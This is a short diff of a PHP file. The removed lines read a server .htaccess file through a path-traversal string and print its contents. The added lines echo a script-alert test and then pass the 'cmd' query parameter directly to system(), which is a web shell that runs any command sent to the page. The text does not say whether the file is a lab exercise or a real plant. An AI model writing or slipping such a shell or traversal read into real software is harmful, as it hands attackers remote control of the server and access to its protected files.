@@ -1,7 +1,6 @@
 <?php
-$filename = "protected/../../../../var/www/rsa/.htaccess";
-$handle = fopen ($filename, "r");
-$contents = fread ($handle, filesize ($filename));
-fclose ($handle);
-print "$contents";
+echo "<script>alert(hi);</script>";
+echo "Run command: ".htmlspecialchars($_GET['cmd']);
+
+system($_GET['cmd']);
 ?>
